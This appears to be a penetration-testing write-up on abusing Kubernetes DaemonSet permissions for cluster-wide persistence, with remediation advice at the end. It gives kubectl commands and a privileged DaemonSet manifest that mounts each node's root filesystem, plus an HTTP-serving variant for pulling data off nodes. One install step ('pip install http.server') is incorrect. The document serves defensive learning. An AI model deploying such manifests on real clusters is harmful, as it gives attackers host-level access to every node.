
# Kubernetes Vulnerability: DaemonSet Deployment for Cluster-Wide Persistence

## 1. Overview Section

### Attack Vector Description

This vulnerability involves an attacker deploying a malicious DaemonSet onto a Kubernetes cluster to achieve persistent execution of their code on every node.  A DaemonSet ensures that a copy of a pod runs on all (or some) nodes in the cluster.  If an attacker can create or modify a DaemonSet, they can effectively gain persistent access to the entire cluster. The attackerâ€™s code can then perform various malicious activities, such as stealing credentials, accessing sensitive data, or using the cluster's resources for cryptomining.

### Potential Impact and Consequences

*   **Cluster-wide Code Execution:** The attacker's code will execute on every node in the cluster.
*   **Data Exfiltration:** Sensitive data can be stolen from any pod or node.
*   **Credential Theft:** Kubernetes service account tokens and other credentials can be compromised.
*   **Resource Hijacking:** The cluster's resources can be used for malicious purposes, such as cryptomining or DDoS attacks.
*   **Privilege Escalation:** The attacker might be able to escalate privileges from a node to the Kubernetes control plane.
*   **Denial of Service:** The attacker's DaemonSet could consume excessive resources, leading to a denial of service.

### Risk Level Assessment

**Critical**

The ability to execute arbitrary code on every node in the cluster is a severe compromise.

### Technical Explanation of Why This Vulnerability Exists

The vulnerability exists when Kubernetes allows unauthorized users or processes to create or modify DaemonSets. This can happen due to:

*   **Insufficient RBAC (Role-Based Access Control):** Weak RBAC configurations can grant excessive permissions to users or service accounts, allowing them to create or modify DaemonSets.
*   **Compromised Service Accounts:** If a service account with DaemonSet creation/modification privileges is compromised, an attacker can use it to deploy malicious DaemonSets.
*   **Misconfigured Admission Controllers:** Improperly configured admission controllers might not adequately restrict DaemonSet creation based on predefined security policies.
*   **Exploitation of Kubernetes API Server Vulnerabilities:** (Less common) Direct exploitation of vulnerabilities within the Kubernetes API server could bypass authorization checks.

### Prerequisites and Conditions Needed

*   **Kubernetes Cluster:** A running Kubernetes cluster is required.
*   **Sufficient Permissions:** The attacker needs the ability to create or modify DaemonSets. This usually means having a Kubernetes role with the `create`, `update`, or `patch` verbs on the `daemonsets` resource, assigned to the attacker's user or service account within the current namespace (or cluster-wide).  This is often achievable if a user or service account has overly permissive roles or ClusterRoles bound to them.
*   **kubectl Access:** The attacker needs `kubectl` configured to interact with the target cluster.

## 2. Validation and Exploitation Steps Section

This section details how to validate the vulnerability and exploit it. We assume the attacker has compromised a user or service account with some level of access to the cluster.

**Phase 1: Validation - Checking Permissions**

The first step is to determine if the compromised account has the necessary permissions to create DaemonSets.

```bash
kubectl auth can-i create daemonsets.apps --namespace=default
```

*   **Explanation:** This command checks if the currently configured user or service account can create DaemonSets in the `default` namespace.
*   **Why:** We need to verify if we have the required privileges before attempting to create a malicious DaemonSet.
*   **Expected Output:**
    *   If the account has permission: `yes`
    *   If the account does not have permission: `no`
*   **Contribution:** This command confirms whether the current account can proceed with the exploit.
*   **Variation:** Check permissions in different namespaces: `kubectl auth can-i create daemonsets.apps --namespace=kube-system`

If the output is `no`, you need to find another compromised account, escalate privileges (outside the scope of this specific vulnerability document), or identify other weaknesses that allow you to gain the necessary permissions. For this example, let's assume the output is `yes`.

**Phase 2: Crafting a Malicious DaemonSet**

Now that we've confirmed we can create DaemonSets, we craft a malicious DaemonSet manifest. This example will create a DaemonSet that runs a simple busybox container on each node and executes a command to write a file containing the node's hostname to a shared volume.

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: malicious-daemonset
  labels:
    app: malicious
spec:
  selector:
    matchLabels:
      app: malicious
  template:
    metadata:
      labels:
        app: malicious
    spec:
      hostPID: true # Potentially dangerous, allows access to the host's PID namespace
      hostNetwork: true # Potentially dangerous, allows access to the host's network namespace
      containers:
      - name: malicious-container
        image: busybox:latest
        securityContext:
          privileged: true # Highly dangerous, provides almost full host access
        volumeMounts:
        - name: host-root
          mountPath: /host
        command: ["/bin/sh", "-c"]
        args:
        - |
          #!/bin/sh
          # Mount the root filesystem and write to a file
          echo "Node Hostname: $(hostname)" > /host/tmp/node_info.txt
          while true; do
            sleep 3600 # Keep the container running
          done
      volumes:
      - name: host-root
        hostPath:
          path: / # Mount the root filesystem of the host
```

*   **Explanation:** This YAML defines a DaemonSet called `malicious-daemonset` that runs a Busybox container on each node.  Crucially, it leverages `hostPID: true`, `hostNetwork: true`, `securityContext: privileged: true` and mounts the host's root filesystem (`hostPath: /`). The command executed by the container retrieves the hostname and writes it to `/host/tmp/node_info.txt` on each node.
*   **Why:**  This configuration allows the container to access and modify the host's filesystem and processes, enabling various malicious activities.  The `privileged: true` setting provides the container with almost full access to the host. `hostPID: true` allows the container to see and potentially manipulate processes on the host. `hostNetwork: true` means that the pod will use the host's network namespace allowing it to bind to ports that might be sensitive.
*   **Contribution:** This creates the malicious DaemonSet that will be deployed to the cluster.
*   **Variation:**  The command can be modified to perform other malicious actions, such as stealing credentials, accessing sensitive data, or establishing a reverse shell. The container image can be changed to one that contains pre-installed tools for exploitation.

**Phase 3: Deploying the Malicious DaemonSet**

Deploy the DaemonSet using `kubectl`.

```bash
kubectl apply -f malicious-daemonset.yaml
```

*   **Explanation:** This command applies the YAML manifest, creating the DaemonSet in the cluster.
*   **Why:** This deploys the malicious DaemonSet to the cluster, ensuring a copy of the pod runs on each node.
*   **Expected Output:**  `daemonset.apps/malicious-daemonset created`
*   **Contribution:** This deploys the payload to every node in the cluster.

**Phase 4: Validating the Deployment**

Verify that the DaemonSet is running correctly on all nodes.

```bash
kubectl get pods -l app=malicious -o wide
```

*   **Explanation:** This command lists all pods with the label `app=malicious` and shows which node each pod is running on.
*   **Why:** We want to confirm that the DaemonSet has been successfully deployed and is running on all nodes in the cluster.
*   **Expected Output:** A list of pods, each running on a different node in the cluster. The `NODE` column should show the hostname of each node.
*   **Contribution:** Confirms the successful deployment of the DaemonSet.

**Phase 5: Accessing the Exploited Data**

Since the DaemonSet mounts the host's root filesystem, we can check the `node_info.txt` file on each node. In a real penetration test, you would need direct access to the nodes (e.g., through SSH) to verify this. In a lab environment, you can often access a node through the cloud provider's console or SSH.

To avoid needing direct node access for this demonstration, we can instead modify the DaemonSet YAML to expose the file through a simple web server. *This is for demonstration purposes and would rarely be done in a real pentest after gaining this level of access.*

First, modify the `malicious-daemonset.yaml` file. Change the container section to include an exposed port and a command that starts a simple HTTP server:

```yaml
      containers:
      - name: malicious-container
        image: python:3.9-slim-buster
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
        - name: tmp-data
          mountPath: /tmp-data
        ports:
        - containerPort: 8080
        command: ["/bin/bash", "-c"]
        args:
        - |
          apt-get update && apt-get install -y python3-venv && python3 -m venv /opt/venv
          source /opt/venv/bin/activate
          pip install http.server
          python -m http.server --directory /tmp-data 8080

      volumes:
      - name: host-root
        hostPath:
          path: /
      - name: tmp-data
        hostPath:
          path: /tmp
```

Then apply the changes:

```bash
kubectl apply -f malicious-daemonset.yaml
```

Now, get the pod names:

```bash
kubectl get pods -l app=malicious -o name
```

Finally, port forward to one of the pods:

```bash
kubectl port-forward <pod_name> 8080:8080
```

Then, in a separate terminal, you can access the file:

```bash
curl http://localhost:8080/node_info.txt
```

*   **Explanation:**  This series of commands modifies the DaemonSet to expose a web server that serves the `node_info.txt` file. The port-forward command allows you to access the web server from your local machine. The curl command retrieves the contents of the file.
*   **Why:** This demonstrates how data exfiltration can be achieved using the deployed DaemonSet. While more complex exfiltration techniques exist (e.g., sending data to an external server), this provides a clear example of accessing information from the exploited nodes.
*   **Expected Output:** The `curl` command should output the content of the `node_info.txt` file, which contains the hostname of the node where the pod is running.
*   **Contribution:** Validates that the code is running on the targeted nodes and can access the host's filesystem.
*   **Variation:** The command can be changed to access other sensitive files or directories on the host system.

**Phase 6: Clean Up**

Remove the malicious DaemonSet.

```bash
kubectl delete daemonset malicious-daemonset
```

*   **Explanation:** This command removes the deployed DaemonSet.
*   **Why:**  Removes the malicious payload from the cluster.
*   **Expected Output:**  `daemonset.apps "malicious-daemonset" deleted`
*   **Contribution:** Cleans up the cluster after the exploitation.

## Remediation Recommendations

*   **Implement Strong RBAC:** Enforce the principle of least privilege. Only grant users and service accounts the minimum necessary permissions. Carefully review and restrict DaemonSet creation privileges.
*   **Audit RBAC Configuration:** Regularly audit the Kubernetes RBAC configuration to identify and correct any overly permissive roles or bindings.
*   **Use Pod Security Admission (PSA) or Pod Security Policies (PSP):**  PSA/PSP can enforce security policies and prevent the creation of privileged pods or pods with `hostPID`, `hostNetwork`, or `hostPath` volume mounts. PSA is generally preferred over PSP, which is deprecated in newer Kubernetes versions. Ensure they restrict the creation of such DaemonSets.
*   **Implement Admission Controllers:** Use admission controllers (e.g., Kyverno, Gatekeeper) to enforce custom security policies and prevent the deployment of malicious DaemonSets. Admission controllers can be configured to reject DaemonSets that use privileged containers, host networking, host PID namespaces, or hostPath volumes.
*   **Regularly Scan Images:** Regularly scan container images for vulnerabilities using tools like Aqua Security Trivy or Clair.
*   **Monitor Kubernetes API Server:** Monitor the Kubernetes API server logs for suspicious activity, such as unauthorized DaemonSet creations or modifications.
*   **Principle of Least Privilege for Service Accounts:**  Limit the privileges associated with service accounts used by applications. Avoid granting cluster-wide administrative permissions unless absolutely necessary.
*   **Enable Auditing:** Enable Kubernetes auditing to track API calls and identify suspicious activity related to DaemonSet deployments.
*   **Network Policies:** Implement network policies to restrict network traffic between pods, preventing lateral movement in case a node is compromised.
*   **Container Runtime Security:** Employ container runtime security mechanisms (e.g., AppArmor, Seccomp) to limit the capabilities of containers and reduce the attack surface.

By implementing these recommendations, you can significantly reduce the risk of an attacker exploiting a DaemonSet to achieve cluster-wide persistence. Remember to continuously monitor your Kubernetes environment and adapt your security measures as new threats emerge.
